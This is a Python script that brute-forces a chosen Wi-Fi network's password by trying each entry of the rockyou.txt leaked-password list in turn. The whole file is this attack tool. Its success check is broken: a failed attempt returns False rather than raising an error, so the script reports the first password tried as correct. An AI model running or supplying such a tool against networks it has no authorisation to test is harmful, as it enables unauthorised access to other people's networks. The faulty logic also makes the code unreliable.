import wifi

inerface = input("WI-FI INTERFACE(default wlan0): ")

def Search():
    wifilist = []

    cells = wifi.Cell.all(inerface)

    for cell in cells:
        wifilist.append(cell)

    return wifilist


def FindFromSearchList(ssid):
    wifilist = Search()

    for cell in wifilist:
        if cell.ssid == ssid:
            return cell

    return False


def Connect(ssid, password):
    cell = FindFromSearchList(ssid)

    if cell:
        # First time to conenct
        if cell:
            if cell.encrypted:
                if password:
                    scheme = Add(cell, password)

                    try:
                        scheme.activate()

                    # Wrong Password
                    except:
                        return False

                    return cell
                else:
                    return False
            else:
                scheme = Add(cell)

                try:
                    scheme.activate()
                except:
                    return False

                return cell

    return False


def Add(cell, password=None):
    if not cell:
        return False

    scheme = wifi.Scheme.for_cell(inerface, cell.ssid, cell, password)
    scheme.save()
    return scheme


if __name__ == '__main__':
    with open('rockyou.txt', errors='ignore') as passwords:
        passwords = passwords.readlines()
    print(Search())
    name = input('WI-FI POINT NAME: ')
    for password in passwords:
        password = password.replace('\n', '')
        try:
            print(Connect(name, str(password)))
            print(password + ' [TRUE]')
            break
        except:
            print(password + ' [FALSE]')
